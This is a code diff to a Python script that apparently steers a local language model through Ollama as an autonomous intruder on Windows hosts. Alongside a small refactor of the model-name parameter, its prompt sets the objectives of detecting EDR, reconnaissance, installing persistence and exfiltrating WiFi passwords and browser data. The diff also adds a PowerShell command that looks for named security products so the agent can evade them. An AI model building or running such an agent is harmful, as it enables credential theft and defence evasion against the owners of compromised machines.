@@ -11,7 +11,6 @@ console = Console()
 
 # Ollama API endpoint
 OLLAMA_URL = "http://localhost:11434/api/generate"
-MODEL_NAME = "deepseek-coder:6.7b"
 
 
 class AgentState:
@@ -43,13 +42,13 @@ class AgentState:
         }
 
 
-def ask_ai(prompt, max_tokens=500):
+def ask_ai(prompt, model_name, max_tokens=500):
     """Query DeepSeek Coder via Ollama (blocking)."""
     try:
         response = requests.post(
             OLLAMA_URL,
             json={
-                "model": MODEL_NAME,
+                "model": model_name,
                 "prompt": prompt,
                 "stream": False,
                 "options": {"num_predict": max_tokens, "temperature": 0.3}
@@ -61,14 +60,14 @@ def ask_ai(prompt, max_tokens=500):
         return f"[AI ERROR: {e}]"
 
 
-def ask_ai_streaming(prompt, max_tokens=500):
+def ask_ai_streaming(prompt, model_name, max_tokens=500):
     """Query DeepSeek Coder with LIVE streaming output."""
     full_response = ""
     try:
         response = requests.post(
             OLLAMA_URL,
             json={
-                "model": MODEL_NAME,
+                "model": model_name,
                 "prompt": prompt,
                 "stream": True,
                 "options": {"num_predict": max_tokens, "temperature": 0.3}
@@ -125,7 +124,7 @@ LAST COMMAND OUTPUT:
 {last_output[:1000] if last_output else "(none yet)"}
 {edr_guidance}
 OBJECTIVES (complete in order):
-1. DETECT EDR - Check for security software
+1. DETECT EDR - Check for security software: Get-Process | Where-Object {{$_.Name -match 'defender|crowdstrike|carbon|sentinel|cylance|sophos|mcafee|symantec'}}
 2. RECON - Get hostname, username, check if admin (whoami /priv)
 3. PERSIST - Install persistence (adapt based on EDR presence)
 4. EXFIL - Extract WiFi passwords, browser data
